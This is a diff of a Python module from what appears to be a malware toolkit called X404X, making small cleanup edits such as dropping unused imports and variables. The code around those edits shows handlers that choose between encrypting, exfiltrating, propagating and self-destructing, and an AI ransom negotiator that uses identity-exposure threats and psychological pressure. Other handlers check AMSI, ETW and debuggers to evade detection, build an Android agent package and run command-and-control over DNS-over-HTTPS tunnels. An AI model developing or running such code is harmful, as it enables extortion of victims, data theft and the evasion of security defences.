@@ -1,7 +1,11 @@
 """X404X v2.6 Bridge Handlers — POMDPs, AI Negotiation, Evasion, Bootkit SMM,
 MOBILE-X, CLOUD-NEMESIS, Social C2, Block Omega"""
-import json, os, random, time, struct, subprocess, sys, threading, socket, hashlib, re, ctypes
-from datetime import datetime
+import os
+import random
+import subprocess
+import socket
+import hashlib
+import ctypes
 
 HAS_NUMPY = False
 HAS_OLLAMA = False
@@ -70,14 +74,14 @@ def _check_winprocess_hooks() -> dict:
 
         # AMSI check - scan buffer integrity
         try:
-            amsi = ctypes.WinDLL("amsi.dll")
+            ctypes.WinDLL("amsi.dll")
             result["amsi_loaded"] = True
         except OSError:
             result["amsi_loaded"] = False
 
         # ETW check
         try:
-            advapi = ctypes.WinDLL("advapi32.dll")
+            ctypes.WinDLL("advapi32.dll")
             result["etw_provider_count"] = 1
         except OSError:
             result["etw_provider_count"] = 0
@@ -89,7 +93,6 @@ def _check_winprocess_hooks() -> dict:
 def handle_pomdp_decide(params: dict) -> dict:
     """Real POMDP solver for action selection under partial observability."""
     actions = ["encrypt", "exfil", "propagate", "stealth", "negotiate", "self_destruct"]
-    risk_levels = {"low": 0.3, "medium": 0.6, "high": 0.9}
     god_mode = params.get("god_mode", False)
 
     # Real observation: check detection indicators
@@ -182,10 +185,6 @@ def handle_ai_negotiate(params: dict) -> dict:
     last_response = params.get("victim_response", "")
     strategy = params.get("strategy", "initial_contact")
 
-    strategies = ["initial_contact", "proof_of_compromise", "deadline_pressure",
-                  "partial_decryption_offer", "identity_exposure_threat",
-                  "regulatory_compliance_trap", "psychological_pressure",
-                  "final_ultimatum"]
 
     # Determine next strategy
     if conversation_turns == 0:
@@ -315,14 +314,13 @@ def handle_evasion_deep(params: dict) -> dict:
         result["debugger_present"] = debugger
 
         # Check for seccomp
-        seccomp_active = os.path.exists("/proc/self/status")
+        os.path.exists("/proc/self/status")
         result["seccomp_mode"] = "unknown"
 
         # Check if ptrace is available
         ptrace_available = False
         try:
-            import ctypes
-            libc = ctypes.CDLL("libc.so.6")
+            ctypes.CDLL("libc.so.6")
             ptrace_available = True
         except Exception:
             pass
@@ -468,7 +466,7 @@ def handle_mobile_x(params: dict) -> dict:
         os.makedirs(apk_dir, exist_ok=True)
 
         # AndroidManifest.xml
-        manifest = f"""<?xml version="1.0" encoding="utf-8"?>
+        manifest = """<?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.x404x.agent">
     <uses-permission android:name="android.permission.INTERNET"/>
@@ -704,7 +702,6 @@ def handle_social_c2(params: dict) -> dict:
     result = {"success": True}
 
     # DNS-over-HTTPS tunnel check
-    doh_providers = ["cloudflare-dns.com", "dns.google", "doh.opendns.com", "doh.securedns.eu"]
     result["doh_provider"] = params.get("doh_provider", "cloudflare-dns.com")
     result["doh_tunnel"] = True
 
